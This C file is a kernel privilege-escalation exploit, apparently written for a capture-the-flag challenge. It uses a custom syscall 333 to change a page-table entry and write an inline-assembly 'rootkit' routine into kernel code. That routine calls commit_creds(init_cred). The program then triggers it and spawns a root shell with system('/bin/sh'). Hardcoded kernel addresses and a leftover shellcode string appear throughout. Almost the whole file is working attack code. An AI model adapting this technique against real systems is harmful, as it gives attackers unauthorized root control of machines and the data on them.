#include <stdio.h>
#include <unistd.h>
#include <stdint.h>

#define FLIPS 0xffffffff818f6cf8
#define COMMIT_CREDS "0xffffffff81034bbc"
#define INIT_CRED "0xffffffff81833100"
#define evil "mov rdi, "INIT_CRED";\nmov rax, "COMMIT_CREDS";\ncall rax;\nret;"

void rootkit();
asm("rootkit:"
    evil);

void GUARD()
{
    return;
}


int main() {
	syscall(333, 0xffff8800018fb060, 2);
	uint64_t* addr = 0xffff8800018fb040;
	*addr = 0x80000000010001e7;
	char* code = 0xffff880001000000 + 0xb1348;
	//char* shellcode = "\x90\x90\x90h\x001\x83\x81_h\xbcK\x03\x81X\xff\xd0\xc3";
	char* shellcode = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB";
	memcpy(code, rootkit, GUARD-rootkit);
	syscall(333, 0xdeadbeef, 0);
	system("/bin/sh");
	return 0;
}
